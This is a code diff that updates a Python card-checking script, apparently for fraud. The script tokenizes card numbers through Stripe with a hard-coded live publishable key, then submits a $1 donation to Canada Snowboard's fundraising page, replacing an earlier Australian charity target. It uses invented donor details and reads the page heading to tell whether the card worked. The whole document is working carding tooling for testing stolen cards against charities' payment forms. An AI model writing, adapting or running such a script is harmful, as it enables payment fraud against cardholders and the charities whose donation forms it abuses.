@@ -13,7 +13,7 @@ def Tele(ccx):
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'accept-language': 'en-US',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'origin': 'https://js.stripe.com',
 	    'referer': 'https://js.stripe.com/',
@@ -26,39 +26,58 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc4c47a1722%3B+stripe-js-v3%2Fc4c47a1722%3B+split-card-element&key=pk_live_6A04a5kca6TR8yLA6h7FL7UT'
+	data = f'key=pk_live_51LsTcMGXCOfsQVIW9dXATKGVOREgEjIs4daDD2QNr71WB2wnZdpVnR6sX4Y2YQ7lJWgFRPYGyT042P7PQ1QcDAw300GimtEWTe&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={mm}&card[exp_year]=20{yy}&card[cvc]={cvc}'
 	
 	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
 	tok = response.json()['id']
 	
 	headers = {
-	    'authority': 'ahvise.org.au',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'authority': 'www.canadasnowboard.ca',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://ahvise.org.au',
-	    'referer': 'https://ahvise.org.au/donation/',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://www.canadasnowboard.ca',
+	    'referer': 'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
 	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	data = {
-	    'action': 'donate',
-	    'email': 'rodamuser08@gmail.com',
-	    'custom_price': '$1',
-	    'usingCustomPrice': 'true',
-	    'price': '1',
-	    'occurance': '',
 	    'stripeToken': f'{tok}',
+	    'total': '1',
+	    'amount_other': '1',
+	    'association': 'National',
+	    'designation': 'General',
+	    'terms_1': 'I confirm that this donation is made voluntarily and unconditionally to Canada Snowboard to support Canadian athletes on their journey to the podium. I understand that Canada Snowboard can direct this donation to the initiative of their choice; however it is preferred that this donation be used to support the designation I\'ve indicated." ',
+	    'name': 'Rodam User',
+	    'organization': '',
+	    'email': 'rodamuser08@gmail.com',
+	    'phone': '4303000850',
+	    'address': 'Street 27',
+	    'city': 'New York',
+	    'province': 'NY',
+	    'postal_code': '10080',
+	    'country': 'US',
+	    'name_on_card': 'Dao Khao Saard',
+	    'comments': '',
+	    'terms_2': 'I understand that an official receipt for tax purposes will be issued in accordance with CRA\'s interpretation of "qualifying donations". I confirm that no benefit will accrue to me or any related party as a result of this contribution and that this donation does not reduce any obligations I am required to pay to Canada Snowboard for "non-qualifying" expenses such as membership/registration fees, travel and training expenses or other expenses I am normally required to pay. I also understand that misrepresentations of tax matters can result in civil penalties imposed against me.',
 	}
 	
-	response = requests.post('https://ahvise.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post(
+	    'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
+	    headers=headers,
+	    data=data,
+	)
 	
-	return (response.text)
+	success = re.search(r"<h1>(.*?)!</h1>", response.text).group(1)
+	
+	return (success)
